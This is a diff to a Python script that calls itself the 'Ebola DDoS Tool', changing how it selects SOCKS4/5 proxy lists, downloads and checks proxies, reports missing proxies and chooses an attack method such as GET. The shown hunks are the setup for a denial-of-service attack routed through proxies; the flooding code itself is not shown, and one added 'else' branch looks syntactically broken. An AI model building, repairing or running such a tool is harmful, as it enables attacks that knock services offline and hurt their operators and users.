@@ -18,6 +18,7 @@ else:
     os.system("clear")
 
 print("""
+
       ▓█████  ▄▄▄▄    ▒█████   ██▓    ▄▄▄   Ebola DDoS Tool Code By 413xPr06605.
 3     ▓█   ▀ ▓█████▄ ▒██▒  ██▒▓██▒   ▒████▄         Windows/Linux Supported Ver.
  1    ▒███   ▒██▒ ▄██▒██░  ██▒▒██░   ▒██  ▀█▄                Socks4/5 Supported.
@@ -404,7 +405,7 @@ except:
         print("Run ~# \'py %s --install\'\nCan Auto Install Module")
         sys.exit()
     else:
-        os.system("cls")
+        os.system("clear")
         print("Run ~# \'python3 %s --install\'\nCan Auto Install Module")
         sys.exit()
 
@@ -427,6 +428,8 @@ if "--clone" in sys.argv:
     else:
         sock_version = "5"
         ipfile = "socks5.txt"
+else:
+    pass
 
 if "--file" in sys.argv:
     ipfile = str(input("Input Custon File : "))
@@ -441,10 +444,14 @@ else:
     pass
 
 if len(sys.argv) ==5:
-    if sock_version == "5":
+    if "--socks5" in sys.argv:
+        sock_version = "5"
         ipfile = "socks5.txt"
-    else:
+    elif "--socks4" in sys.argv:
+        sock_version = "4"
         ipfile = "socks4.txt"
+    else:
+        pass
     proxies = open(ipfile).readlines()
     if len(proxies) ==0:
         print("No Available Socks Found")
@@ -453,13 +460,23 @@ if len(sys.argv) ==5:
         sys.exit()
     else:
         pass
+else:
+    pass
 
 if "--check" in sys.argv:
     proxies = open(ipfile).readlines()
     check_socks()
 else:
     proxies = open(ipfile).readlines()
-    print('\33]0;[%s] EbolaVirus-[Ready]\a'%(len(proxies)),end='')
+    if len(proxies) ==0:
+        print("No Available Socks Found")
+        print("Use --socks5 or --socks4 Set Socks Version")
+        print("Or Use --clone To Auto Download Socks")
+        sys.exit()
+    else:
+        print('\33]0;[%s] EbolaVirus-[Ready]\a'%(len(proxies)),end='')
+else:
+    pass
 
 if "--method=GET" in sys.argv:
     attack_type = "GET"
